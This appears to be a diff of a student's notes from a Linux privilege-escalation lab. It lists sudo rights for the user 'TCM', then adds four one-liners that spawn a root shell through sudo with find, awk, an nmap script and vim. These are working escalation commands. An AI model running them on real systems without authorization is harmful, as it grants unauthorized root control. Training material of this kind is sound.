@@ -21,4 +21,15 @@ User TCM may run the following commands on this host:
     (root) NOPASSWD: /usr/sbin/apache2
     (root) NOPASSWD: /bin/more
 
-2.
+2. We could use following commands to get root.
+(a) 
+ sudo find /bin -name nano -exec /bin/sh \;
+ 
+ (b) sudo awk 'BEGIN {system("/bin/sh")}'
+ 
+ (c) 
+ echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
+ 
+ (d)  sudo vim -c '!sh'
+ 
+ 
